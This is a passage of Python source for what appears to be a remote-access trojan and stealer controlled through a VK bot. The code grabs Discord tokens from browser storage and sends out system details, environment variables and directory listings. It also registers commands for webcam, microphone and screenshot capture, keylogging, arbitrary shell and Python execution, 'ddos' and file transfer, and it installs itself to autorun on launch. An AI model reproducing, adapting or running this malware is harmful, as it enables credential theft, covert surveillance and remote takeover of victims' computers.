            tags_file.write(json.dumps({
                "tags": CLIENT_TAGS
            }))
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[Tags] Failed to save tags! Exception - {exception}")


# Utils.

def list_intersects(list_a: typing.List, list_b: typing.List) -> bool:
    """ Returns true if any of the item is intersects. """
    for item in list_a:
        if item in list_b:
            return True
    return False


def list_difference(list_a, list_b) -> typing.List:
    """ Function that returns difference between given two lists. """
    return [element for element in list_a if element not in list_b]


def get_operating_system() -> str:
    """ Returns current operating system. """

    if sys.platform.startswith("win32"):
        return "Windows"

    if sys.platform.startswith("linux"):
        return "Linux"

    return f"UNKNOWN_OS_{sys.platform}"


def get_hwid() -> str:
    """ Returns system unique hardware index. """

    try:
        hwid_grab_command = "wmic csproduct get uuid"
        process = subprocess.Popen(hwid_grab_command, shell=True, stdin=sys.stdin, stdout=sys.stdout,
                                   stderr=sys.stderr)
        return str((process.stdout.read() + process.stderr.read()).decode().split("\n")[1])
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[HWID] Failed to grab from the system! Exception - {exception}")
        return DEFAULT_INVALID_HWID


def get_ip() -> typing.Dict:
    """ Returns IP information. """

    try:
        return requests.get("https://ipinfo.io/json").json()
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[IP] Failed to grap IP from the system! Exception - {exception}")

    return {"ip": DEFAULT_INVALID_IP}


def get_environment_variables() -> typing.Dict:
    """ Returns list of all environment variables in system. """
    return {variable: os.environ.get(variable) for variable in os.environ}

def record_microphone(path, seconds: int = 1) -> None:
    """ Records microphone. """

    try:
        import pyaudio  # pylint: disable=import-outside-toplevel
        import wave  # pylint: disable=import-outside-toplevel
    except ImportError:
        debug_message("[Microphone] Recording microphone is not supported on selected PC! "
                      "(opencv-python (CV2) module is not installed)")
        return

    audio = pyaudio.PyAudio()
    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, frames_per_buffer=1024, input=True)
    frames = []

    for _ in range(0, int(44100 / 1024 * int(seconds))):
        data = stream.read(1024)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    audio.terminate()

    fs.build_path(path)
    file = wave.open(path, 'wb')
    file.setnchannels(1)
    file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
    file.setframerate(44100)
    file.writeframes(b''.join(frames))
    file.close()


# Commands.

def initialise_commands() -> None:
    """ Initialises commands. """

    global COMMANDS_FUNCTIONS
    COMMANDS_FUNCTIONS = {
        "screenshot": command_screenshot,
        "webcam": command_webcam,
        "microphone": command_microphone,
        "help": command_help,
        "version": command_version,
        "tags": command_tags,
        "location": command_location,
        "keylog": command_keylog,
        "taskkill": command_taskkill,
        "cd": command_cd,
        "ls": command_ls,
        "drives": command_drives,
        "discord_tokens": command_discord_tokens,
        "discord_profile": command_discord_profile,
        "discord_profile_raw": command_discord_profile_raw,
        "tags_new": command_tags_new,
        "tags_add": command_tags_add,
        "shutdown": command_shutdown,
        "restart": command_restart,
        "console": command_console,
        "upload": command_upload,
        "ddos": command_ddos,
        "link": command_link,
        "name_new": command_name_new,
        "exit": command_exit,
        "python": command_python,
        "message": command_message,
        "destruct": command_destruct,
        "download": command_download,
        "properties": command_properties,
        "alive": command_alive
    }

    global COMMANDS_HELP
    COMMANDS_HELP = {
        "discord_profile_raw": (
            "Returns you all RAW (as dict (JSON)) information about client Discord profile",
            "discord_profile_raw"
        ),
        "discord_tokens": (
            "Returns you all found Discord tokens in client system",
            "discord_tokens"
        ),
        "discord_profile": (
            "Returns you all information about client Discord profile",
            "discord_profile"
        ),
        "download": (
            "Downloads file from the client client.",
            "download [required]PATH"
        ),
        "screenshot": (
            "Returns you an photo (screenshot) from screen of the client.",
            "screenshot"
        ),
        "webcam": (
            "Returns you an photo from webcam of the client (Only if it connected to the PC).",
            "webcam"
        ),
        "microphone": (
            "Returns you an voice message from microphone of the client, "
            "for that amount of the seconds that you specify (Only if it connected to the PC).",
            "microphone [optional, default is 1]SECONDS"
        ),
        "help": (
            "Returns list of the all commands in the app, "
            "if you specify command, shows documentation to given command itself.",
            "help [optional]COMMAND"
        ),
        "version": (
            "Returns current version of the app instance that is currently running on the client PC "
            "(That is get this command).",
            "version"
        ),
        "tags": (
            "Returns an list separated by ,(comma) of the all tags that have called instance of the app.",
            "tags"
        ),
        "location": (
            "Returns location (fully not very precise) of the client (Gets throughout IP).", "location"
        ),
        "keylog": (
            "Returns log of the keylogger.",
            "keylog"
        ),
        "cd": (
            "Changes directory of the files commands, if you don't specify directory, this will show it"
            "(Write only name of directory in current directory or full path itself).",
            "cd [optional]DIRECTORY"
        ),
        "ls": (
            "Returns list of the files in current directory (Or directory that you specify) separated by ,(comma).",
            "ls"
        ),
        "drives": (
            "Returns list of the all drives in the system separated by ,(comma)",
            "drives"
        ),
        "tags_new": (
            "Replaces all old tags with these new.",
            "tags_new [required]TAGS(Separated by;)"
        ),
        "tags_add": (
            "Adds given tags to all other tags.",
            "tags_add [required]TAGS(Separated by ;)"
        ),
        "shutdown": (
            "Shutdowns client PC.",
            "shutdown"
        ),
        "restart": (
            "Restarts client PC.",
            "restart"
        ),
        "console": (
            "Executes console command and returns it code (0 if all OK)",
            "console"
        ),
        "ddos": (
            "Pings given address",
            "ddos [required]ADDRESS"
        ),
        "link": (
            "Opens link in a client browser.",
            "link [required]URI"
        ),
        "name_new": (
            "Replaces old name with this name",
            "name_new [required]NAME"
        ),
        "exit": (
            "Exits app (Will be launched when PC is restarted)",
            "exit"
        ),
        "python": (
            "Executes python code, if you want to get output write - global OUT "
            "OUT = \"Hello World!\" and this is gonna be shown.",
            "python [required]CODE"
        ),
        "message": (
            "Shows message to the user. (Styles - from 0 to 6, changes buttons)",
            "message [required]TEXT;TITLE[optional];STYLE[optional]"
        ),
        "destruct": (
            "Delete app from the system (Removing from the autorun and closing)",
            "destruct"
        ),
        "alive": (
            "Shows current time",
            "alive"
        )
    }


# Discord.

def discord_api_call(method: str, params: typing.Dict, func, data, token: str) -> typing.Any:
    """ Calls Discord API. """

    return func(
        f"https://discord.com/api/{method}",
        params=params,
        headers={
            "Authorization": f"{token}",
            "Content-Type": "application/json"
        },
        data=data
    )


# Stealer.


def stealer_steal_all(force: bool = False) -> None:
    """
    Steals all data.
    :param force: If true, steals even if already worked.
    """

    try:
        if not stealer_is_already_worked() or force:
            data: typing.Dict[str, typing.Any] = {}
            userprofile = os.getenv("userprofile")
            drive = os.getcwd().split("\\")[0]

            ip = get_ip()
            data["internet_ipaddress"] = ip["ip"]
            data["internet_city"] = ip["city"]
            data["internet_country"] = ip["country"]
            data["internet_region"] = ip["region"]
            data["internet_provider"] = ip["org"]

            if FEATURE_STARTUP_HWID_GRABBING_ENABLED:
                data["computer_hardware_index"] = get_hwid()

            if FEATURE_STARTUP_DISCORD_GRABBING_ENABLED:
                data["discord_tokens"] = stealer_steal_discord_tokens()
                data["discord_profile"] = stealer_steal_discord_profile(data["discord_tokens"])

            if not sys.platform.startswith("linux"):
                data["computer_processor"] = os.getenv("NUMBER_OF_PROCESSORS", "") + " cores "
                data["computer_processor"] += os.getenv("PROCESSOR_ARCHITECTURE", "") + " "
                data["computer_processor"] += os.getenv("PROCESSOR_IDENTIFIER", "") + " "
                data["computer_processor"] += os.getenv("PROCESSOR_LEVEL", "") + " "
                data["computer_processor"] += os.getenv("PROCESSOR_REVISION", "")

                data["computer_username"] = os.getenv("UserName")
                data["computer_name"] = os.getenv("COMPUTERNAME")
                data["computer_operating_system"] = os.getenv("OS")

                data["computer_environment_variables"] = get_environment_variables()

                data["directory_root"] = fs.try_listdir(f"{drive}\\")
                data["directory_programfiles"] = fs.try_listdir(f"{drive}\\Program Files")
                data["directory_programfiles86"] = fs.try_listdir(f"{drive}\\Program Files (x86)")
                data["directory_downloads"] = fs.try_listdir(f"{userprofile}\\Downloads")
                data["directory_documents"] = fs.try_listdir(f"{userprofile}\\Documents")
                data["directory_desktop"] = fs.try_listdir(f"{userprofile}\\Desktop")

            path = get_folder() + get_config()["paths"]["log"]
            fs.build_path(path)

            with open(path, "w", encoding="UTF-8") as log_file:
                json.dump(data, log_file, indent=4)

            for peer in get_config()["server"]["vk"]["peers"]:
                uploading_status, uploading_result = server_upload_document(path, "Log File", peer, "doc")

                if uploading_status and isinstance(uploading_result, str):
                    server_message("[Stealer] First launch data:", uploading_result, peer)
                else:
                    server_message(f"[Stealer] Error when uploading first launch data: {uploading_result}", None, peer)

            fs.try_delete(path)
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[Stealer] Failed to steall all! Exception - {exception}")


def stealer_steal_discord_profile(tokens: typing.List[str] = None) -> typing.Optional[typing.Dict]:
    """ Steals all discord profile information. """

    if tokens is None:
        tokens = stealer_steal_discord_tokens()

    if not tokens:
        return None

    api_response: requests.Response = discord_api_call("users/@me", {}, requests.get, None, tokens[0])
    return api_response.json()


def stealer_steal_discord_tokens() -> typing.List[str]:
    """ Steals all discord tokens. """

    appdata_roaming = os.getenv("APPDATA", "")
    appdata_local = os.getenv("LOCALAPPDATA", "")

    paths: typing.List[str] = [
        appdata_roaming + "\\Discord\\Local Storage\\leveldb",
        appdata_roaming + "\\discordcanary\\Local Storage\\leveldb",
        appdata_roaming + "\\discordptb\\Local Storage\\leveldb",
        appdata_roaming + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
        appdata_local + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
        appdata_local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
        appdata_local + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"
    ]

    tokens: typing.List[str] = []

    for token_path in (path for path in paths if os.path.exists(path)):
        for log_file in (file for file in fs.try_listdir(token_path) if
                         file.endswith(".log") or file.endswith(".ldb")):
            with open(f"{token_path}\\{log_file}", errors="ignore") as file:
                for line in [line.strip() for line in file.readlines() if line.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in re.findall(regex, line):
                            if "mfa." in token:
                                tokens.append(token)

    return list(set(tokens))


def stealer_is_already_worked() -> bool:
    """ Returns true if stealer already worked. """

    path: str = get_folder() + get_config()["paths"]["anchor"]

    if not os.path.exists(path):

        fs.build_path(path)
        with open(path, "w", encoding="UTF-8") as anchor_file:
            anchor_file.write("Anchor")

        return False
    return True


# Other.

def check_operating_system_supported() -> None:
    """ Exits code if operating system is not supported. """

    for platform in PLATFORMS_SUPPORTED:
        if sys.platform.startswith(platform):
            if platform in PLATFORMS_DEVELOPMENT:
                debug_message(f"You are currently running this app on platform {platform} "
                              "which is not fully supported!")
            return

    debug_message("Oops... You are running app on the platform "
                  f"{sys.platform} which is not supported! Sorry for that!")
    sys.exit(1)


def peer_is_allowed(peer: str) -> bool:
    """Returns given peer is allowed or not. """

    peers: typing.List = get_config()["server"]["vk"]["peers"]

    if peers is None or len(peers) == 0:
        return True
    
    return peer in peers


def exit_handler() -> None:
    """ Handler for the exit event (at_exit). """
    
    server_message(command_exit().get_text())
    debug_message("[Exit Handler] Exit...")


def lock() -> None:
    RunLock(get_folder() + "lock")


def launch() -> None:
    """ Application entry point. """

    multiprocessing.freeze_support() # TODO. CHECK ASAP.

    try:
        debug_message("[Launch] Starting...")

        # load_config()
        check_operating_system_supported()
        lock()

        load_tags()
        load_name()

        initialise_commands()
        server_connect()
        server_message(f"Connected to the network! (His tags: {', '.join(CLIENT_TAGS)})")

        autorun_register()
        atexit.register(exit_handler)

        stealer_steal_all()

        drives_waching_start()
        keylogger_start()
        
        debug_message("[Launch] Launch end! Starting listening server...")
        server_listen()
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[Launch] Failed to launch! Exception - {exception}")
        sys.exit(1)
